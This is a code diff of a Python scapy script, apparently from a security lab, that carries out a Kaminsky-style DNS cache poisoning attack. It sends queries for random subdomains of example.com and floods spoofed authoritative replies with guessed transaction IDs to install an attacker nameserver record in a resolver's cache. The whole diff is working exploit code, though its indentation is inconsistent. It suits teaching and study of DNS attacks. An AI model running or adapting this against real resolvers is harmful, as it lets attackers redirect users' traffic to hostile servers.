@@ -38,61 +38,53 @@ Generates random 8-bit integer.
 def getRandomTXID():
 	return randint(0, 256)
 
-fakename = getRandomSubDomain() + getRandomSubDomain()
 
-result_NS = ""
 '''
 Sends a UDP packet.
 '''
 def sendPacket(sock, packet, ip, port):
     sock.sendto(str(packet), (ip, port))
 
-def sendDNSReply():
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
-    newNS=DNSRR(rrname="example.com", ttl=3600, type='NS', rdata="ns.dbslabattacker.net")
-    tryPacket = DNS(rd=1, id=getRandomTXID(), qd=DNSQR(qname=fakename+'.example.com'), ns=newNS)
-    #print "\n***** Attacker Packet Sent from Remote Server *****"
-    #tryPacket.show2()
-    #print "\n***** Attacker Packet Sent to Remote Server *****"
-    sendPacket(sock, tryPacket, my_ip, my_query_port)
-
-class Blinky(threading.Thread):
-    def __init__(self):
-        threading.Thread.__init__(self)
-        self.daemon = True
-        self._finished = False
-
-    def __enter__(self):
-        self.start()
-
-    def __exit__(self, exc_type, exc_val, exc_tb):
-        self.stop()
-
-    def run(self):
-        while not self._finished:
-	    sendDNSReply()
-
-    def stop(self):
-        self._finished = True
+# Modify packet
+def pktmodify(pkt):
+	pkt.aa=1
+	pkt.nscount=1
+	pkt.ns.rrname="example.com"
+	pkt.ns.rdata="ns.dnslabattacker.net"
+	pkt.arcount=0
+	pkt.ar=None
+	return pkt
 
 '''
 Example code that sends a DNS query using scapy.
 '''
 def exampleSendDNSQuery():
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
-    dnsPacket = DNS(rd=1, qd=DNSQR(qname=fakename+'.example.com'))
-    sendPacket(sock, dnsPacket, my_ip, my_port)
-    # tryPacket = DNS(rd=1, id=getRandomTXID(), qd=DNSQR(qname=fakename+'example.com'), ns=DNSRR(rrname="example.com", rdata="ns.dbslabattacker.net"))
-    response = sock.recv(4096)
-    response = DNS(response)
-    print "\n***** Packet Received from Remote Server *****"
-    print response.show()
-    print 'result NS is ' + response[DNS].ns[DNSRR].rdata
-    print "***** End of Remote Server Packet *****\n"
-    result_NS = response[DNS].ns[DNSRR].rdata
+        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
+	QPacket = DNS(rd=1, qd=DNSQR(qname='example.com'))
+	sendPacket(sock, QPacket, my_ip, my_port)
+        response = sock.recv(4096)
+        response = DNS(response)
+	newpkt = pktmodify(response)
+	result_NS = ""
+	while result_NS.find("dnslabattacker")==-1:
+		fakename = getRandomSubDomain()
+		newpkt.qd.qname = fakename + '.example.com'
+		newpkt.an.rrname = fakename + '.example.com'
+		QPacket.qd.qname = fakename + '.example.com'
+		sendPacket(sock, QPacket, my_ip, my_port)
+                for i in range(50):
+			newpkt.id = getRandomTXID()
+			sendPacket(sock, newpkt, my_ip, my_query_port)
+                response = sock.recv(4096)
+                response = DNS(response)
+                #print response.show2()
+		if response.nscount==0:
+			result_NS = "SERVER FAILURE"
+		else:
+			result_NS = response[DNS].ns[DNSRR].rdata
+                #print 'result NS is ' + result_NS
+	#response.show()
+	#print("Success!") 
 
 if __name__ == '__main__':
-	while result_NS != "ns.dnslabattacker.net":
-		fakename = getRandomSubDomain() + getRandomSubDomain()
-		with Blinky():
-			exampleSendDNSQuery()
+	exampleSendDNSQuery()
